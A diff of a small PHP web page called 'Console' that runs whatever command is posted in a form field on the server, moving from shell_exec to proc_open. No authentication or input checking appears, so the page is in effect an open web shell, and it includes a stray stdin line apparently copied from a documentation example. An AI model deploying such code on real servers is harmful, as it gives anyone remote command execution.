@@ -44,16 +44,38 @@
 		</style>
 	</head>
 	<body>
-		<h1>Console bash</h1>
+		<h1>Console</h1>
 		<?php
 			session_start();
-			if (isset($_POST["commande"]) && $_POST["commande"]=="") {
-			} elseif (isset($_SESSION["nbr_bash"]) && isset($_SESSION["commande"]) && isset($_POST["commande"])) {
+			if (isset($_SESSION["nbr_bash"]) && isset($_SESSION["commande"]) && isset($_POST["commande"])) {
 				$_SESSION["commande"][$_SESSION["nbr_bash"]]=$_POST["commande"];
-				$_SESSION["reponse"][$_SESSION["nbr_bash"]] = shell_exec ($_SESSION["cd"].$_SESSION["commande"][$_SESSION["nbr_bash"]]);
-				if($_POST["commande"][0]=="c" && $_POST["commande"][1]=="d" && $_POST["commande"][2]==" ") {
-					$_SESSION["cd"]=$_SESSION["cd"].$_POST["commande"].";";
+
+				$descriptorspec = array(
+					0 => array("pipe", "r"),
+					1 => array("pipe", "w"),
+					2 => array("file", "/tmp/error-output.txt", "a")
+				 );
+				 
+				 $cwd = '/';
+				 $env = array();
+
+				$process = proc_open(
+					$_SESSION["commande"][$_SESSION["nbr_bash"]],
+					$descriptorspec,
+					$pipes,
+					$cwd,
+					$env
+				);
+				if (is_resource($process)) {
+					fwrite($pipes[0], '<?php print_r($_ENV); ?>');
+					fclose($pipes[0]);
+				
+					$_SESSION["reponse"][$_SESSION["nbr_bash"]] =  stream_get_contents($pipes[1]);
+					fclose($pipes[1]);
+				
+					$return_value = proc_close($process);
 				}
+				
 				$_SESSION["nbr_bash"]++;
 			} else {
 				$_SESSION["nbr_bash"]=0;
@@ -63,7 +85,6 @@
 				$_SESSION["reponse"] = array(
 					1 => "connexion"
 				);
-				$_SESSION["cd"] = "cd /;";
 				session_write_close();
 			}
 
